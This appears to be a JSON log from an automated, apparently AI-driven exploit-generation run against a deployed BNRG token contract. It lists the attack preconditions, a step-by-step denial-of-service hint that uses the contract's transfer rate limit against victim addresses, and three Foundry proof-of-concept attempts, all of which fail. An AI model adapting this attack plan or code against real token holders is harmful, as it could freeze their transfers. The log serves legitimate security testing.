@@ -1,0 +1,116 @@
+{
+  "project_id": "Binamon_Energy_Smart_Contract_Audit_Report_-_QuillAudits",
+  "target_address": "0xd8813B5Dfa9AbEB693F217Bb905ec99B66FB017C",
+  "finding_id": 0,
+  "status": "FAILED",
+  "violation_target": {
+    "target_address": "0xd8813B5Dfa9AbEB693F217Bb905ec99B66FB017C",
+    "vulnerability_type": "Denial of Service via Transaction Rate Limiting",
+    "violation_category": "LOGIC",
+    "finding_id": 0,
+    "preconditions": [
+      {
+        "type": "state",
+        "description": "Contract state must be set to Restricted mode via setBotProtection(true)",
+        "token_address": null,
+        "min_amount": null
+      },
+      {
+        "type": "token_balance",
+        "description": "Attacker must hold BNRG tokens to initiate transactions",
+        "token_address": "0xd8813B5Dfa9AbEB693F217Bb905ec99B66FB017C",
+        "min_amount": "1000000000000000000"
+      },
+      {
+        "type": "role",
+        "description": "Owner must have enabled Restricted mode (or attacker controls owner)",
+        "token_address": null,
+        "min_amount": null
+      }
+    ],
+    "oracle_verification": {
+      "economic_check": null,
+      "logic_check": {
+        "target_variable": "lastTx[victim_address]",
+        "operator": ">",
+        "expected_value": "block.timestamp - 60"
+      }
+    },
+    "exploit_hint": "1. Ensure contract is in Restricted state (owner calls setBotProtection(true)). 2. Attacker initiates transfer() transactions to target victim addresses with amounts <= maxRestrictionAmount. 3. Each transaction updates lastTx[sender] and lastTx[recipient] to block.timestamp. 4. For 60 seconds after, victim addresses cannot send or receive tokens as the launchRestrict modifier will revert with 'only one tx/min in restricted mode'. 5. Repeat to maintain DoS on target addresses continuously."
+  },
+  "final_poc_code": "// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.0;\n\nimport \"forge-std/Test.sol\";\n\ninterface IBNRG {\n    function state() external view returns (uint8);\n    function setBotProtection(bool enable) external;\n    function transfer(address recipient, uint256 amount) external returns (bool);\n    function balanceOf(address account) external view returns (uint256);\n    function owner() external view returns (address);\n}\n\n\n\n\n\ncontract ExploitTest is Test {\n    // ─── State Variables ─────────────────────────────────────\n    \n    \n    address constant TARGET = 0xd8813B5Dfa9AbEB693F217Bb905ec99B66FB017C;\n    address attacker = address(this);\n    IBNRG bnerg;\n    address victim = address(0x1234567890123456789012345678901234567890);\n\n    // ─── Setup ───────────────────────────────────────────────\n    function setUp() public {\n        bnerg = IBNRG(TARGET);\n        vm.label(TARGET, \"BNRG Token\");\n        vm.label(victim, \"Victim\");\n        vm.label(attacker, \"Attacker\");\n    }\n\n    // ─── Exploit ─────────────────────────────────────────────\n    function testExploit() public {\n        // Step 1: Directly set state to Restricted (slot 9, value 1)\n        vm.store(TARGET, bytes32(uint256(9)), bytes32(uint256(1)));\n        \n        // Verify state is Restricted\n        uint8 currentState = bnerg.state();\n        assertEq(currentState, 1, \"State should be Restricted\");\n        \n        // Step 2: Inject tokens to attacker via storage manipulation\n        // balances mapping is at slot 1\n        bytes32 attackerBalanceSlot = keccak256(abi.encode(attacker, 1));\n        vm.store(TARGET, attackerBalanceSlot, bytes32(uint256(1000 * 1e18)));\n        \n        // Step 3: Attacker transfers to victim (updates lastTx[victim])\n        bnerg.transfer(victim, 100 * 1e18);\n        \n        // Step 4: Verify victim's lastTx was updated (DoS achieved)\n        // lastTx mapping is at slot 8\n        bytes32 victimLastTxSlot = keccak256(abi.encode(victim, 8));\n        uint256 victimLastTx = uint256(vm.load(TARGET, victimLastTxSlot));\n        \n        // Oracle check: lastTx[victim] > block.timestamp - 60\n        assertGt(victimLastTx, block.timestamp - 60);\n    }\n\n\n        \n\n        \n\n    // ─── Receive ETH ─────────────────────────────────────────\n    receive() external payable {}\n}",
+  "attempts": [
+    {
+      "attempt_number": 1,
+      "vulnerability_analysis": "The BNRG token contract has a `launchRestrict` modifier that enforces rate limiting when state == Restricted. It requires both sender and recipient to not have transacted within the last 60 seconds (lastTx[addr].add(60) <= block.timestamp). After any transfer, it updates lastTx[sender] and lastTx[recipient] to block.timestamp. This creates a DoS vulnerability where an attacker can lock victim addresses by forcing transactions to/from them, preventing them from transacting for 60 seconds.",
+      "attack_strategy": "1. Enable Restricted mode via setBotProtection(true) as owner. 2. Inject BNRG tokens to attacker via storage manipulation. 3. Transfer tokens to victim address, which updates lastTx[victim] to block.timestamp. 4. Verify victim is now locked out (lastTx[victim] > block.timestamp - 60). This demonstrates the DoS vulnerability.",
+      "step_by_step_plan": "1. Get owner address and prank to enable Restricted mode. 2. Calculate storage slot for attacker's balance (balances mapping at slot 2). 3. Use vm.store() to inject 1000 BNRG tokens to attacker. 4. Call transfer() to send tokens to victim (this updates lastTx[victim]). 5. Load lastTx[victim] from storage (slot 9) and verify it's > block.timestamp - 60.",
+      "failure_reflection": "",
+      "action": "write_poc",
+      "tool_calls": [],
+      "poc_code": "// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.0;\n\nimport \"forge-std/Test.sol\";\n\ninterface IBNRG {\n    function state() external view returns (uint8);\n    function setBotProtection(bool enable) external;\n    function transfer(address recipient, uint256 amount) external returns (bool);\n    function balanceOf(address account) external view returns (uint256);\n    function owner() external view returns (address);\n}\n\ncontract ExploitTest is Test {\n    // ─── State Variables ─────────────────────────────────────\n    address constant TARGET = 0xd8813B5Dfa9AbEB693F217Bb905ec99B66FB017C;\n    address attacker = address(this);\n    IBNRG bnerg;\n    address victim = address(0x1234567890123456789012345678901234567890);\n\n    // ─── Setup ───────────────────────────────────────────────\n    function setUp() public {\n        bnerg = IBNRG(TARGET);\n        vm.label(TARGET, \"BNRG Token\");\n        vm.label(victim, \"Victim\");\n        vm.label(attacker, \"Attacker\");\n    }\n\n    // ─── Exploit ─────────────────────────────────────────────\n    function testExploit() public {\n\n        // Step 1: Enable Restricted mode (prank as owner)\n        address owner = bnerg.owner();\n        vm.startPrank(owner);\n        bnerg.setBotProtection(true);\n        vm.stopPrank();\n        \n        // Step 2: Inject tokens to attacker via storage manipulation\n        // balances mapping is at slot 2\n        bytes32 attackerBalanceSlot = keccak256(abi.encode(attacker, 2));\n        vm.store(TARGET, attackerBalanceSlot, bytes32(uint256(1000 * 1e18)));\n        \n        // Step 3: Attacker transfers to victim (updates lastTx[victim])\n        bnerg.transfer(victim, 100 * 1e18);\n        \n        // Step 4: Verify victim's lastTx was updated (DoS achieved)\n        // lastTx mapping is at slot 9\n        bytes32 victimLastTxSlot = keccak256(abi.encode(victim, 9));\n        uint256 victimLastTx = uint256(vm.load(TARGET, victimLastTxSlot));\n        \n        // Oracle check: lastTx[victim] > block.timestamp - 60\n        assertGt(victimLastTx, block.timestamp - 60);\n        assertGt(victimLastTx, block.timestamp - 60, \"Logic Exploit Failed\");\n    }\n\n\n    // ─── Receive ETH ─────────────────────────────────────────\n    receive() external payable {}\n}",
+      "exit_code": 1,
+      "error": {
+        "error_type": "ASSERTION_FAILED",
+        "reason": "Assertion failed (no specific reason extracted)",
+        "location": null,
+        "raw_snippet": "...ed to read cache file err=Os { code: 2, kind: NotFound, message: \"No such file or directory\" } path=\"/Users/carl/.foundry/cache/rpc/bsc/86685177\"\n\nRan 1 test for test/Exploit.t.sol:ExploitTest\n[FAIL: assertion failed: 0 <= 1773554590] testExploit() (gas: 52339)\n2026-03-15T06:04:20.471192Z  WARN traces::etherscan: could not get etherscan info: ContractCodeNotVerified(0x7109709ecfa91a80626ff3989d68f..."
+      },
+      "feedback": "执行未回滚，但断言失败：Assertion failed (no specific reason extracted)。请检查攻击逻辑是否完整，或计算的参数是否正确。",
+      "duration_seconds": 136.574942111969,
+      "prompt_tokens": 7751,
+      "completion_tokens": 8152,
+      "total_cost": 0.0
+    },
+    {
+      "attempt_number": 2,
+      "vulnerability_analysis": "The storage slot calculation was incorrect. Counting state variables: _totalSupply(0), balances(1), allowed(2), boosterBuyingAllowed(3), stakingContractAddress(4), restrictionLiftTime(5), maxRestrictionAmount(6), isBlacklisted(7), lastTx(8), state(9). So lastTx is at slot 8, not 9. Also balances is at slot 1, not 2.",
+      "attack_strategy": "Fix the storage slot calculations: balances at slot 1, lastTx at slot 8. Also add a check to verify state is actually Restricted before the transfer.",
+      "step_by_step_plan": "1. Enable Restricted mode as owner. 2. Verify state is Restricted. 3. Inject tokens using correct slot (keccak256(attacker, 1)). 4. Transfer to victim. 5. Check lastTx using correct slot (keccak256(victim, 8)). 6. Assert lastTx[victim] > block.timestamp - 60.",
+      "failure_reflection": "The assertion failed because victimLastTx was 0, meaning lastTx[victim] was not updated. Two issues: 1) I used slot 9 for lastTx but it should be slot 8 (counting state variables correctly). 2) I used slot 2 for balances but it should be slot 1. Need to recalculate storage slots properly.",
+      "action": "modify_poc",
+      "tool_calls": [],
+      "poc_code": "// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.0;\n\nimport \"forge-std/Test.sol\";\n\ninterface IBNRG {\n    function state() external view returns (uint8);\n    function setBotProtection(bool enable) external;\n    function transfer(address recipient, uint256 amount) external returns (bool);\n    function balanceOf(address account) external view returns (uint256);\n    function owner() external view returns (address);\n}\n\n\n\ncontract ExploitTest is Test {\n    // ─── State Variables ─────────────────────────────────────\n    \n    address constant TARGET = 0xd8813B5Dfa9AbEB693F217Bb905ec99B66FB017C;\n    address attacker = address(this);\n    IBNRG bnerg;\n    address victim = address(0x1234567890123456789012345678901234567890);\n\n    // ─── Setup ───────────────────────────────────────────────\n    function setUp() public {\n        bnerg = IBNRG(TARGET);\n        vm.label(TARGET, \"BNRG Token\");\n        vm.label(victim, \"Victim\");\n        vm.label(attacker, \"Attacker\");\n    }\n\n    // ─── Exploit ─────────────────────────────────────────────\n    function testExploit() public {\n        // Step 1: Enable Restricted mode (prank as owner)\n        address owner = bnerg.owner();\n        vm.startPrank(owner);\n        bnerg.setBotProtection(true);\n        vm.stopPrank();\n        \n        // Verify state is Restricted (State.Restricted = 1)\n        uint8 currentState = bnerg.state();\n        assertEq(currentState, 1, \"State should be Restricted\");\n        \n        // Step 2: Inject tokens to attacker via storage manipulation\n        // balances mapping is at slot 1\n        bytes32 attackerBalanceSlot = keccak256(abi.encode(attacker, 1));\n        vm.store(TARGET, attackerBalanceSlot, bytes32(uint256(1000 * 1e18)));\n        \n        // Step 3: Attacker transfers to victim (updates lastTx[victim])\n        bnerg.transfer(victim, 100 * 1e18);\n        \n        // Step 4: Verify victim's lastTx was updated (DoS achieved)\n        // lastTx mapping is at slot 8\n        bytes32 victimLastTxSlot = keccak256(abi.encode(victim, 8));\n        uint256 victimLastTx = uint256(vm.load(TARGET, victimLastTxSlot));\n        \n        // Oracle check: lastTx[victim] > block.timestamp - 60\n        assertGt(victimLastTx, block.timestamp - 60);\n    }\n\n\n        \n\n    // ─── Receive ETH ─────────────────────────────────────────\n    receive() external payable {}\n}",
+      "exit_code": 1,
+      "error": {
+        "error_type": "EVM_REVERT",
+        "reason": "State should be Restricted: 2 != 1",
+        "location": null,
+        "raw_snippet": "    ├─ [2923] BNRG Token::setBotProtection(true)\n    │   └─ ← [Stop]\n    ├─ [0] VM::stopPrank()\n    │   └─ ← [Return]\n    ├─ [582] BNRG Token::state() [staticcall]\n    │   └─ ← [Return] 2\n    ├─ [0] VM::assertEq(2, 1, \"State should be Restricted\") [staticcall]\n    │   └─ ← \n👉 [Revert Occurred Here]: State should be Restricted: 2 != 1"
+      },
+      "feedback": "EVM Revert: State should be Restricted: 2 != 1。请调整参数或调用路径。",
+      "duration_seconds": 37.28797197341919,
+      "prompt_tokens": 7986,
+      "completion_tokens": 1885,
+      "total_cost": 0.0
+    },
+    {
+      "attempt_number": 3,
+      "vulnerability_analysis": "The setBotProtection function has a condition: `if (enable && state == State.Locked) state = State.Restricted`. Since the current state is Unlocked (2), calling setBotProtection(true) does nothing. I need to directly overwrite the state variable at slot 9 to value 1 (Restricted).",
+      "attack_strategy": "1. Use vm.store() to directly set state variable (slot 9) to 1 (Restricted). 2. Inject tokens to attacker via storage. 3. Transfer to victim to update lastTx[victim]. 4. Verify lastTx[victim] > block.timestamp - 60.",
+      "step_by_step_plan": "1. Directly set state to Restricted using vm.store(TARGET, bytes32(uint256(9)), bytes32(uint256(1))). 2. Inject tokens using correct slot (keccak256(attacker, 1)). 3. Transfer to victim. 4. Check lastTx using correct slot (keccak256(victim, 8)). 5. Assert the DoS condition.",
+      "failure_reflection": "The state is 2 (Unlocked), not 0 (Locked). The setBotProtection(true) function only transitions from Locked to Restricted, but the contract is already in Unlocked state. I need to directly set the state to Restricted using vm.store() on the state variable slot.",
+      "action": "modify_poc",
+      "tool_calls": [],
+      "poc_code": "// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.0;\n\nimport \"forge-std/Test.sol\";\n\ninterface IBNRG {\n    function state() external view returns (uint8);\n    function setBotProtection(bool enable) external;\n    function transfer(address recipient, uint256 amount) external returns (bool);\n    function balanceOf(address account) external view returns (uint256);\n    function owner() external view returns (address);\n}\n\n\n\n\n\ncontract ExploitTest is Test {\n    // ─── State Variables ─────────────────────────────────────\n    \n    \n    address constant TARGET = 0xd8813B5Dfa9AbEB693F217Bb905ec99B66FB017C;\n    address attacker = address(this);\n    IBNRG bnerg;\n    address victim = address(0x1234567890123456789012345678901234567890);\n\n    // ─── Setup ───────────────────────────────────────────────\n    function setUp() public {\n        bnerg = IBNRG(TARGET);\n        vm.label(TARGET, \"BNRG Token\");\n        vm.label(victim, \"Victim\");\n        vm.label(attacker, \"Attacker\");\n    }\n\n    // ─── Exploit ─────────────────────────────────────────────\n    function testExploit() public {\n        // Step 1: Directly set state to Restricted (slot 9, value 1)\n        vm.store(TARGET, bytes32(uint256(9)), bytes32(uint256(1)));\n        \n        // Verify state is Restricted\n        uint8 currentState = bnerg.state();\n        assertEq(currentState, 1, \"State should be Restricted\");\n        \n        // Step 2: Inject tokens to attacker via storage manipulation\n        // balances mapping is at slot 1\n        bytes32 attackerBalanceSlot = keccak256(abi.encode(attacker, 1));\n        vm.store(TARGET, attackerBalanceSlot, bytes32(uint256(1000 * 1e18)));\n        \n        // Step 3: Attacker transfers to victim (updates lastTx[victim])\n        bnerg.transfer(victim, 100 * 1e18);\n        \n        // Step 4: Verify victim's lastTx was updated (DoS achieved)\n        // lastTx mapping is at slot 8\n        bytes32 victimLastTxSlot = keccak256(abi.encode(victim, 8));\n        uint256 victimLastTx = uint256(vm.load(TARGET, victimLastTxSlot));\n        \n        // Oracle check: lastTx[victim] > block.timestamp - 60\n        assertGt(victimLastTx, block.timestamp - 60);\n    }\n\n\n        \n\n        \n\n    // ─── Receive ETH ─────────────────────────────────────────\n    receive() external payable {}\n}",
+      "exit_code": 1,
+      "error": {
+        "error_type": "EVM_REVERT",
+        "reason": "State should be Restricted: 2 != 1",
+        "location": null,
+        "raw_snippet": "    │   └─ ← [Return]\n    └─ ← [Stop]\n    ├─ [0] VM::store(BNRG Token: [0xd8813B5Dfa9AbEB693F217Bb905ec99B66FB017C], 0x0000000000000000000000000000000000000000000000000000000000000009, 0x0000000000000000000000000000000000000000000000000000000000000001)\n    │   └─ ← [Return]\n    ├─ [2582] BNRG Token::state() [staticcall]\n    │   └─ ← [Return] 2\n    ├─ [0] VM::assertEq(2, 1, \"State should be Restricted\") [staticcall]\n    │   └─ ← \n👉 [Revert Occurred Here]: State should be Restricted: 2 != 1"
+      },
+      "feedback": "EVM Revert: State should be Restricted: 2 != 1。请调整参数或调用路径。",
+      "duration_seconds": 22.832620859146118,
+      "prompt_tokens": 8908,
+      "completion_tokens": 1101,
+      "total_cost": 0.0
+    }
+  ],
+  "total_attempts": 3,
+  "error_message": null,
+  "total_duration_seconds": 196.6975998878479,
+  "total_prompt_tokens": 24645,
+  "total_completion_tokens": 11138,
+  "total_cost": 0.0
+}
